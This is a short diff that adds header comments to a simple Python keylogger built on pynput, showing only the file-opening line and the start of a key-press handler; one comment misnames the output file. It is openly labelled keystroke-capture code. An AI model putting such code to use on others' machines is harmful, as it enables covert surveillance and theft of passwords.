@@ -1,3 +1,6 @@
+#Simple keylogger program built using various sources around the web
+#Outputs keystrokes to file called keylogger.py 
+#Press ESC to quit
 from pynput import keyboard
 f = open("keylogger.txt", "a")
 def on_press(key):
